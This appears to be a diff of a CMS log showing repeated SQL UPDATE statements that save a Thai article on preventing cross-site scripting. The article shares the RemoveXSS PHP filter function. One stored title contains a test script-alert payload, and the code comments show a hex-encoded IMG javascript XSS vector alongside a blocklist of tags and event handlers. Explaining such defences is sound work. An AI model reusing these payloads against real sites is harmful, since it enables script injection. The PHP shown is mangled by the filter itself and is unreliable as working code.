+&nbsp;&nbsp; // this prevents like &lt;IMG SRC=&amp;#X40&amp;#X61&amp;#X76&amp;#X61&amp;#X73&amp;#X63&amp;#X72&amp;#X69&amp;#X70&amp;#X74&amp;#X3A &amp;#X61&amp;#X6C&amp;#X65&amp;#X72&amp;#X74&amp;#X28&amp;#X27&amp;#X58&amp;#X53&amp;#X53&amp;#X27&amp;#X29&gt;<br />
+&nbsp;&nbsp; $search = \'abcdefghijklmnopqrstuvwxyz\';<br />
+&nbsp;&nbsp; $search .= \'ABCDEFGHIJKLMNOPQRSTUVWXYZ\';<br />
+&nbsp;&nbsp; $search .= \'1234567890!@#$%^&amp;*()\';<br />
+&nbsp;&nbsp; $search .= \'~`&quot;;:?+/={}[]-_|\\\'\\\\\';<br />
+&nbsp;&nbsp; for ($i = 0; $i &lt; strlen($search); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // ;? matches the ; which is optional<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 0{07} matches any padded zeros which are optional and go up to 8 chars<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#x0040 @ search for the hex values<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#[xX]0{08}\'.dechex(ord($search[$i])).\';?)/i\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#00064 @ 0{07} matches \'0\' zero to seven times<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#0{08}\'.ord($search[$i]).\';?)/\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // now the only remaining whitespace attacks are \\t \\n and \\r<br />
+&nbsp;&nbsp; $ra1 = Array(\'ja<x>vasc<x>ript\' \'vb<x>sc<x>ript\' \'ex<x>pression\' \'ap<x>plet\' \'me<x>ta\' \'xm<x>l\' \'bl<x>ink\' \'li<x>nk\' \'st<x>yle\' \'sc<x>ript\' \'em<x>bed\' \'ob<x>ject\' \'if<x>rame\' \'fr<x>ame\' \'fr<x>ameset\' \'il<x>ayer\' \'la<x>yer\' \'bg<x>sound\' \'ti<x>tle\' \'ba<x>se\');<br />
+&nbsp;&nbsp; $ra2 = Array(\'on<x>abort\' \'on<x>activate\' \'on<x>afterprint\' \'on<x>afterupdate\' \'on<x>beforeactivate\' \'on<x>beforecopy\' \'on<x>beforecut\' \'on<x>beforedeactivate\' \'on<x>beforeeditfocus\' \'on<x>beforepaste\' \'on<x>beforeprint\' \'on<x>beforeunload\' \'on<x>beforeupdate\' \'on<x>blur\' \'on<x>bounce\' \'on<x>cellchange\' \'on<x>change\' \'on<x>click\' \'on<x>contextmenu\' \'on<x>controlselect\' \'on<x>copy\' \'on<x>cut\' \'on<x>dataavailable\' \'on<x>datasetchanged\' \'on<x>datasetcomplete\' \'on<x>dblclick\' \'on<x>deactivate\' \'on<x>drag\' \'on<x>dragend\' \'on<x>dragenter\' \'on<x>dragleave\' \'on<x>dragover\' \'on<x>dragstart\' \'on<x>drop\' \'on<x>error\' \'on<x>errorupdate\' \'on<x>filterchange\' \'on<x>finish\' \'on<x>focus\' \'on<x>focusin\' \'on<x>focusout\' \'on<x>help\' \'on<x>keydown\' \'on<x>keypress\' \'on<x>keyup\' \'on<x>layoutcomplete\' \'on<x>load\' \'on<x>losecapture\' \'on<x>mousedown\' \'on<x>mouseenter\' \'on<x>mouseleave\' \'on<x>mousemove\' \'on<x>mouseout\' \'on<x>mouseover\' \'on<x>mouseup\' \'on<x>mousewheel\' \'on<x>move\' \'on<x>moveend\' \'on<x>movestart\' \'on<x>paste\' \'on<x>propertychange\' \'on<x>readystatechange\' \'on<x>reset\' \'on<x>resize\' \'on<x>resizeend\' \'on<x>resizestart\' \'on<x>rowenter\' \'on<x>rowexit\' \'on<x>rowsdelete\' \'on<x>rowsinserted\' \'on<x>scroll\' \'on<x>select\' \'on<x>selection<x>change\' \'on<x>selectstart\' \'on<x>start\' \'on<x>stop\' \'on<x>submit\' \'on<x>unload\');<br />
+&nbsp;&nbsp; $ra = array_merge($ra1 $ra2);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; $found = true; // keep replacing as long as the previous round replaced something<br />
+&nbsp;&nbsp; while ($found == true) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val_before = $val;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($i = 0; $i &lt; sizeof($ra); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern = \'/\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($j &gt; 0) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(&amp;#[xX]0{08}([9ab]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|(&amp;#0{08}([9|10|13]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \')*\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= $ra[$i][$j];<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'/i\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $replacement = substr($ra[$i] 0 2).\'&lt;x&gt;\'.substr($ra[$i] 2); // add in &lt;&gt; to nerf the tag<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace($pattern $replacement $val); // filter out the hex tags<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($val_before == $val) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // no replacements were made so exit the loop<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $found = false;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; return $val;<br />
+} <br />
+&nbsp;</x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></p>
+<p><u><b>ที่มา </b></u>http://kallahar.com/smallprojects/php_xss_filter_function.php</p>' Where content_id = 25 
+16:03:20 :  => Update content SET category_id='1',content_name='มาป้องกัน Cross-Site scripting อันร้ายกาจกันครับ <script>alert(\"\");</script>',content_summary='<p>มาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ<br />
+พอดีไปเจอมาช่วยได้เยอะครับ แต่ไม่แน่ใจว่าครอบคลุมหรือเปล่า<br />
+ตอนแรกผมก็โดน SQL Injection ด้วยและก็มี sc<x>ript บางตัวหลุด<br />
+อย่างที่ไม่คาดคิดว่ามันจะร้ายกาจได้ขนาดนี้ ต้องขอบคุณ พี่ด้า Inpross มากนะครับ<br />
+ที่อุตส่าห์นั่งหาสาเหตุกันตั้งนานสองนาน</x></x></p>
+<p><x><x><br />
+</x></x></p>',content_detail='<p><b>เอาไปเลยครับ sc<x>ript </x></b></p>
+<p>function RemoveXSS($val) {<br />
+&nbsp;&nbsp; // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed<br />
+&nbsp;&nbsp; // this prevents some character re-spacing such as &lt;java\\0sc<x>ript&gt;<br />
+&nbsp;&nbsp; // note that you have to handle splits with \\n \\r and \\t later since they *are* allowed in some inputs<br />
+&nbsp;&nbsp; $val = preg_replace(\'/([\\x00-\\x08\\x0b-\\x0c\\x0e-\\x19])/\' \'\' $val);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // straight replacements the user should never need these since they\'re normal characters<br />
+&nbsp;&nbsp; // this prevents like &lt;IMG SRC=&amp;#X40&amp;#X61&amp;#X76&amp;#X61&amp;#X73&amp;#X63&amp;#X72&amp;#X69&amp;#X70&amp;#X74&amp;#X3A &amp;#X61&amp;#X6C&amp;#X65&amp;#X72&amp;#X74&amp;#X28&amp;#X27&amp;#X58&amp;#X53&amp;#X53&amp;#X27&amp;#X29&gt;<br />
+&nbsp;&nbsp; $search = \'abcdefghijklmnopqrstuvwxyz\';<br />
+&nbsp;&nbsp; $search .= \'ABCDEFGHIJKLMNOPQRSTUVWXYZ\';<br />
+&nbsp;&nbsp; $search .= \'1234567890!@#$%^&amp;*()\';<br />
+&nbsp;&nbsp; $search .= \'~`&quot;;:?+/={}[]-_|\\\'\\\\\';<br />
+&nbsp;&nbsp; for ($i = 0; $i &lt; strlen($search); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // ;? matches the ; which is optional<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 0{07} matches any padded zeros which are optional and go up to 8 chars<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#x0040 @ search for the hex values<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#[xX]0{08}\'.dechex(ord($search[$i])).\';?)/i\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#00064 @ 0{07} matches \'0\' zero to seven times<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#0{08}\'.ord($search[$i]).\';?)/\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // now the only remaining whitespace attacks are \\t \\n and \\r<br />
+&nbsp;&nbsp; $ra1 = Array(\'ja<x>vasc<x>ript\' \'vb<x>sc<x>ript\' \'ex<x>pression\' \'ap<x>plet\' \'me<x>ta\' \'xm<x>l\' \'bl<x>ink\' \'li<x>nk\' \'st<x>yle\' \'sc<x>ript\' \'em<x>bed\' \'ob<x>ject\' \'if<x>rame\' \'fr<x>ame\' \'fr<x>ameset\' \'il<x>ayer\' \'la<x>yer\' \'bg<x>sound\' \'ti<x>tle\' \'ba<x>se\');<br />
+&nbsp;&nbsp; $ra2 = Array(\'on<x>abort\' \'on<x>activate\' \'on<x>afterprint\' \'on<x>afterupdate\' \'on<x>beforeactivate\' \'on<x>beforecopy\' \'on<x>beforecut\' \'on<x>beforedeactivate\' \'on<x>beforeeditfocus\' \'on<x>beforepaste\' \'on<x>beforeprint\' \'on<x>beforeunload\' \'on<x>beforeupdate\' \'on<x>blur\' \'on<x>bounce\' \'on<x>cellchange\' \'on<x>change\' \'on<x>click\' \'on<x>contextmenu\' \'on<x>controlselect\' \'on<x>copy\' \'on<x>cut\' \'on<x>dataavailable\' \'on<x>datasetchanged\' \'on<x>datasetcomplete\' \'on<x>dblclick\' \'on<x>deactivate\' \'on<x>drag\' \'on<x>dragend\' \'on<x>dragenter\' \'on<x>dragleave\' \'on<x>dragover\' \'on<x>dragstart\' \'on<x>drop\' \'on<x>error\' \'on<x>errorupdate\' \'on<x>filterchange\' \'on<x>finish\' \'on<x>focus\' \'on<x>focusin\' \'on<x>focusout\' \'on<x>help\' \'on<x>keydown\' \'on<x>keypress\' \'on<x>keyup\' \'on<x>layoutcomplete\' \'on<x>load\' \'on<x>losecapture\' \'on<x>mousedown\' \'on<x>mouseenter\' \'on<x>mouseleave\' \'on<x>mousemove\' \'on<x>mouseout\' \'on<x>mouseover\' \'on<x>mouseup\' \'on<x>mousewheel\' \'on<x>move\' \'on<x>moveend\' \'on<x>movestart\' \'on<x>paste\' \'on<x>propertychange\' \'on<x>readystatechange\' \'on<x>reset\' \'on<x>resize\' \'on<x>resizeend\' \'on<x>resizestart\' \'on<x>rowenter\' \'on<x>rowexit\' \'on<x>rowsdelete\' \'on<x>rowsinserted\' \'on<x>scroll\' \'on<x>select\' \'on<x>selection<x>change\' \'on<x>selectstart\' \'on<x>start\' \'on<x>stop\' \'on<x>submit\' \'on<x>unload\');<br />
+&nbsp;&nbsp; $ra = array_merge($ra1 $ra2);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; $found = true; // keep replacing as long as the previous round replaced something<br />
+&nbsp;&nbsp; while ($found == true) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val_before = $val;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($i = 0; $i &lt; sizeof($ra); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern = \'/\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($j &gt; 0) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(&amp;#[xX]0{08}([9ab]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|(&amp;#0{08}([9|10|13]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \')*\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= $ra[$i][$j];<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'/i\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $replacement = substr($ra[$i] 0 2).\'&lt;x&gt;\'.substr($ra[$i] 2); // add in &lt;&gt; to nerf the tag<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace($pattern $replacement $val); // filter out the hex tags<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($val_before == $val) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // no replacements were made so exit the loop<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $found = false;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; return $val;<br />
+} <br />
+&nbsp;</x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></p>
+<p><u><b>ที่มา </b></u>http://kallahar.com/smallprojects/php_xss_filter_function.php</p>' Where content_id = 25 
+17:03:51 :  => Update content SET category_id='1',content_name='มาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ ',content_summary='<p>มาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ<br />
+พอดีไปเจอมาช่วยได้เยอะครับ แต่ไม่แน่ใจว่าครอบคลุมหรือเปล่า<br />
+ตอนแรกผมก็โดน SQL Injection ด้วยและก็มี sc<x>ript บางตัวหลุด<br />
+อย่างที่ไม่คาดคิดว่ามันจะร้ายกาจได้ขนาดนี้ ต้องขอบคุณ พี่ด้า Inpross มากนะครับ<br />
+ที่อุตส่าห์นั่งหาสาเหตุกันตั้งนานสองนาน</x></x></p>
+<p><x><x><br />
+</x></x></p>',content_detail='<p><b>เอาไปเลยครับ sc<x>ript </x></b></p>
+<p>function RemoveXSS($val) {<br />
+&nbsp;&nbsp; // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed<br />
+&nbsp;&nbsp; // this prevents some character re-spacing such as &lt;java\\0sc<x>ript&gt;<br />
+&nbsp;&nbsp; // note that you have to handle splits with \\n \\r and \\t later since they *are* allowed in some inputs<br />
+&nbsp;&nbsp; $val = preg_replace(\'/([\\x00-\\x08\\x0b-\\x0c\\x0e-\\x19])/\' \'\' $val);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // straight replacements the user should never need these since they\'re normal characters<br />
+&nbsp;&nbsp; // this prevents like &lt;IMG SRC=&amp;#X40&amp;#X61&amp;#X76&amp;#X61&amp;#X73&amp;#X63&amp;#X72&amp;#X69&amp;#X70&amp;#X74&amp;#X3A &amp;#X61&amp;#X6C&amp;#X65&amp;#X72&amp;#X74&amp;#X28&amp;#X27&amp;#X58&amp;#X53&amp;#X53&amp;#X27&amp;#X29&gt;<br />
+&nbsp;&nbsp; $search = \'abcdefghijklmnopqrstuvwxyz\';<br />
+&nbsp;&nbsp; $search .= \'ABCDEFGHIJKLMNOPQRSTUVWXYZ\';<br />
+&nbsp;&nbsp; $search .= \'1234567890!@#$%^&amp;*()\';<br />
+&nbsp;&nbsp; $search .= \'~`&quot;;:?+/={}[]-_|\\\'\\\\\';<br />
+&nbsp;&nbsp; for ($i = 0; $i &lt; strlen($search); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // ;? matches the ; which is optional<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 0{07} matches any padded zeros which are optional and go up to 8 chars<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#x0040 @ search for the hex values<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#[xX]0{08}\'.dechex(ord($search[$i])).\';?)/i\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#00064 @ 0{07} matches \'0\' zero to seven times<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#0{08}\'.ord($search[$i]).\';?)/\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // now the only remaining whitespace attacks are \\t \\n and \\r<br />
+&nbsp;&nbsp; $ra1 = Array(\'ja<x>vasc<x>ript\' \'vb<x>sc<x>ript\' \'ex<x>pression\' \'ap<x>plet\' \'me<x>ta\' \'xm<x>l\' \'bl<x>ink\' \'li<x>nk\' \'st<x>yle\' \'sc<x>ript\' \'em<x>bed\' \'ob<x>ject\' \'if<x>rame\' \'fr<x>ame\' \'fr<x>ameset\' \'il<x>ayer\' \'la<x>yer\' \'bg<x>sound\' \'ti<x>tle\' \'ba<x>se\');<br />
+&nbsp;&nbsp; $ra2 = Array(\'on<x>abort\' \'on<x>activate\' \'on<x>afterprint\' \'on<x>afterupdate\' \'on<x>beforeactivate\' \'on<x>beforecopy\' \'on<x>beforecut\' \'on<x>beforedeactivate\' \'on<x>beforeeditfocus\' \'on<x>beforepaste\' \'on<x>beforeprint\' \'on<x>beforeunload\' \'on<x>beforeupdate\' \'on<x>blur\' \'on<x>bounce\' \'on<x>cellchange\' \'on<x>change\' \'on<x>click\' \'on<x>contextmenu\' \'on<x>controlselect\' \'on<x>copy\' \'on<x>cut\' \'on<x>dataavailable\' \'on<x>datasetchanged\' \'on<x>datasetcomplete\' \'on<x>dblclick\' \'on<x>deactivate\' \'on<x>drag\' \'on<x>dragend\' \'on<x>dragenter\' \'on<x>dragleave\' \'on<x>dragover\' \'on<x>dragstart\' \'on<x>drop\' \'on<x>error\' \'on<x>errorupdate\' \'on<x>filterchange\' \'on<x>finish\' \'on<x>focus\' \'on<x>focusin\' \'on<x>focusout\' \'on<x>help\' \'on<x>keydown\' \'on<x>keypress\' \'on<x>keyup\' \'on<x>layoutcomplete\' \'on<x>load\' \'on<x>losecapture\' \'on<x>mousedown\' \'on<x>mouseenter\' \'on<x>mouseleave\' \'on<x>mousemove\' \'on<x>mouseout\' \'on<x>mouseover\' \'on<x>mouseup\' \'on<x>mousewheel\' \'on<x>move\' \'on<x>moveend\' \'on<x>movestart\' \'on<x>paste\' \'on<x>propertychange\' \'on<x>readystatechange\' \'on<x>reset\' \'on<x>resize\' \'on<x>resizeend\' \'on<x>resizestart\' \'on<x>rowenter\' \'on<x>rowexit\' \'on<x>rowsdelete\' \'on<x>rowsinserted\' \'on<x>scroll\' \'on<x>select\' \'on<x>selection<x>change\' \'on<x>selectstart\' \'on<x>start\' \'on<x>stop\' \'on<x>submit\' \'on<x>unload\');<br />
+&nbsp;&nbsp; $ra = array_merge($ra1 $ra2);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; $found = true; // keep replacing as long as the previous round replaced something<br />
+&nbsp;&nbsp; while ($found == true) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val_before = $val;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($i = 0; $i &lt; sizeof($ra); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern = \'/\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($j &gt; 0) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(&amp;#[xX]0{08}([9ab]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|(&amp;#0{08}([9|10|13]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \')*\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= $ra[$i][$j];<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'/i\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $replacement = substr($ra[$i] 0 2).\'&lt;x&gt;\'.substr($ra[$i] 2); // add in &lt;&gt; to nerf the tag<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace($pattern $replacement $val); // filter out the hex tags<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($val_before == $val) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // no replacements were made so exit the loop<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $found = false;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; return $val;<br />
+} <br />
+&nbsp;</x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></p>
+<p><u><b>ที่มา </b></u>http://kallahar.com/smallprojects/php_xss_filter_function.php</p>' Where content_id = 25 
